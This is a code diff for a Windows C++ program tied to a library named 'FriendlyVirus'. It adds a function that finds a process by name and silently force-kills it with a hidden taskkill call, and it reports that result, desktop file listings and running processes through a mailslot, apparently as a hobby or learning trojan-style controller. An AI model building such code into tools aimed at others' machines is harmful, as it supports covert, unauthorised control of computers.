@@ -6,10 +6,79 @@
 #include <ShlObj.h>
 #include<exception>
 #include<PathCch.h>
+#include<TlHelp32.h>
 #include"../FriendlyVirus/FriendlyVirus.h"
 
 #pragma comment(lib,"shell32.lib")
 #pragma comment(lib,"../debug/FriendlyVirus.lib")
+
+;
+WCHAR* KillProcessByName(WCHAR* processName) {
+	HANDLE hSnapshot;
+	PROCESSENTRY32 pe;
+	WCHAR *msg=nullptr;
+	DWORD pid = 0;
+	BOOL result = 0;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(STARTUPINFO));
+	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot==INVALID_HANDLE_VALUE)
+	{
+		WCHAR msgTmp[] = L"CreateToolhelp32SSnapshot() failed!";
+		int size = (lstrlen(msgTmp) + 1) * 2;
+		msg = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+		CopyMemory(msg, msgTmp, size);
+		return msg;
+	}
+	Process32Next(hSnapshot, &pe);
+	do {
+		if (lstrcmp(pe.szExeFile, processName) == 0) {
+			pid = pe.th32ProcessID;
+		}
+	} while (Process32Next(hSnapshot, &pe));
+	if (pid==0)
+	{
+		WCHAR msgTmp[] = L"target program does not exist!";
+		int size = (lstrlen(msgTmp) + 1) * 2;
+		msg = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+		CopyMemory(msg, msgTmp, size);
+		return msg;
+	}
+	WCHAR cmdline[46] = L"taskkill /F /pid ";
+	WCHAR wpid[14];
+	//将DWORD类型转换成wchar_t型字符串
+	_itow_s(pid, wpid, 10);
+	lstrcat(cmdline, wpid);
+	result = CreateProcess(NULL,cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	if (result) {
+		WCHAR msgTmp[] = L"target process terminate successful!";
+		int size = (lstrlen(msgTmp) + 1) * 2;
+		msg = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+		CopyMemory(msg, msgTmp, size);
+		return msg;
+	}
+	else {
+		WCHAR msgTmp[] = L"target process terminate failed!";
+		int size = (lstrlen(msgTmp) + 1) * 2;
+		msg = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
+		CopyMemory(msg, msgTmp, size);
+		return msg;
+	}
+}
+
+
+void PrintMessage(WCHAR **src) {
+	WCHAR **tmp = NULL;
+	tmp = src;
+	while (*tmp) {
+		printf("%ws\n", *tmp);
+		tmp++;
+	}
+}
+
 //公共函数，向邮槽发送信息
 VOID SendMyMessage(WCHAR**(*p)()) {
 	WCHAR **content = NULL;
@@ -21,6 +90,15 @@ VOID SendMyMessage(WCHAR**(*p)()) {
 		content++;
 	}
 	FreePointers(&content_);
+	
+}
+
+//overload the function SendMyMessage
+void SendMyMessage(WCHAR* (p)(WCHAR *param),WCHAR* prgName) {
+	WCHAR *msg = NULL;
+	msg = p(prgName);
+	SendMessageToMailslot(msg, (lstrlen(msg) + 1) * sizeof(WCHAR));
+	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, msg);
 }
 
 
@@ -112,22 +190,23 @@ int main(int argc,char *argv[])
 	if (argc==3)
 	{
 		if (strcmp(argv[1], "kill") == 0) {
-
+			WCHAR *exeName = nullptr;
+			CHARToWCHAR(&exeName, argv[2]);
+			SendMyMessage(KillProcessByName,exeName);
 		}
-		if (strcmp(argv[1], "") == 0) {
+		else if (strcmp(argv[1], "") == 0) {
 
 		}
 	}
-	if (argc == 2) {
+	else if (argc == 2) {
 		if (strcmp(argv[1], "desktopfile") == 0) {
 			SendMyMessage(GetFilesInDesktop);
-			
 		}
-		if (strcmp(argv[1], "processes") == 0) {
+		else if (strcmp(argv[1], "processes") == 0) {
 			SendMyMessage(GetAllRunningProcess);
 		}
 	}
-	if (argc == 1) {
+	else if (argc == 1) {
 		printf("本程序的功能有:\n");
 		printf("========\n========\n"); 
 	}
